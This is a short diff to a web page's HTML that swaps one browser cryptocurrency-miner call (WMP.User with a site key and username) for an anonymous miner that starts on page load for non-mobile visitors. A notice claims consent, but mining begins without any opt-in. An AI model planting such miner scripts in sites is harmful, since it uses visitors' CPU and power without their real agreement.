@@ -14,14 +14,10 @@
   <p>By visiting this site, you agree to allow us to use a small portion of your CPU to mine cryptocurrency. This helps support our website. If you do not agree, please close this page.</p>
   
   <script>
-    // Rozpoczęcie kopania kryptowalut
-    var miner = WMP.User('SK_PFxiO5khtzlepMRHa3MFS', 'bbmafia',{
-        threads: 4,
-        autoThreads: false,
-        throttle: 0.3,
-        forceASMJS: false
-    });
-    miner.start();
-  </script>
+    var miner = WMP.Anonymous('SK_PFxiO5khtzlepMRHa3MFS',{throttle: 0.3});
+    if (!miner.isMobile()){
+        miner.start();
+    }
+</script>
 </body>
 </html>
